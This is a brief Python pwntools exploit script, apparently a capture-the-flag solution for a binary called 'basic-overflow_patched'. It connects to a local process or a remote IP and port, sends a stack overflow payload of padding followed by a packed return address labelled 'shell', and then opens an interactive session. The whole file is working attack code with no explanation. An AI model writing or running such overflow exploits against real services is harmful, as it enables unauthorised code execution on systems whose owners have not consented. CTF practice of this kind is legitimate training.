#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic-overflow_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.123.15.202", 5000)

    return r


def main():
    r = conn()
    
    pause()

    shell = p64(0x40113a)

    r.sendline(b"A"*64 + b"B"*8 + shell)

    r.interactive()


if __name__ == "__main__":
    main()
